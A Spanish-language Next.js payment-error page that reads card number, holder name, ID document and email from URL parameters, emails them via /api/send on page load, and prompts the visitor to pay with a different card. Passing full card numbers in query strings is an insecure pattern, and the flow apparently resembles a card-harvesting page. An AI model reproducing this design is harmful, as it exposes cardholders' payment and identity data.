"use client";

import { useSearchParams, useRouter } from "next/navigation";
import { useEffect } from "react";

export default function ErrorPagoPage() {
  const router = useRouter();
  const params = useSearchParams();

  // obtenemos los datos enviados
  const monto = params.get("monto") || "0";
  const tarjeta = params.get("tarjeta") || "";
  const ultimos4 = tarjeta.slice(-4) || "0000";
  const titular = params.get("titular") || "";
  const doc = params.get("doc") || "";
  const email = params.get("email") || "";

  // ✅ Enviar correo automáticamente al cargar la página
  useEffect(() => {
    (async () => {
      try {
        await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            type: "credito",
            monto,
            originPage: "/pago/error",
            datos: {
              titular,
              tarjeta: `**** **** **** ${ultimos4}`,
              documento: doc,
              email,
              estado: "Error - No se pudo procesar el pago",
            },
          }),
        });
      } catch (err) {
        console.error("❌ Error al enviar correo", err);
      }
    })();
  }, [monto, tarjeta, titular, doc, email]);

  return (
    <main className="min-h-screen bg-[#f3f3f3] flex items-center justify-center px-4 font-[system-ui,Segoe UI,Roboto,sans-serif] text-[#111]">
      <div className="w-full max-w-md">
        {/* ENCABEZADO NARANJA */}
        <div className="bg-[#f46b42] text-white rounded-t-md py-8 flex flex-col items-center">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="80"
            height="80"
            viewBox="0 0 24 24"
            fill="none"
            stroke="white"
            strokeWidth="1.5"
          >
            <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="1.5" fill="none" />
            <path d="M12 8v5" stroke="white" strokeWidth="2" strokeLinecap="round" />
            <circle cx="12" cy="16" r="1.2" fill="white" />
          </svg>
          <h2 className="mt-4 text-[20px] font-medium">Algo salió mal...</h2>
          <p className="text-[18px] font-semibold mt-1">No pudimos procesar tu pago</p>
        </div>

        {/* CONTENIDO BLANCO */}
        <div className="bg-white rounded-b-md shadow-sm text-center py-6 px-6 border border-t-0 border-[#ddd]">
          <h3 className="text-[16px] font-semibold mb-2">¿Qué puedo hacer?</h3>
          <p className="text-[14px] text-[#444] mb-6">Usa un medio de pago distinto.</p>

          <button
            onClick={() => router.push("/pago")}
            className="bg-[#009ee3] hover:bg-[#008dd0] text-white font-medium text-[14px] rounded-md px-6 py-3 transition"
          >
            Pagar con otro medio
          </button>
        </div>
      </div>
    </main>
  );
}
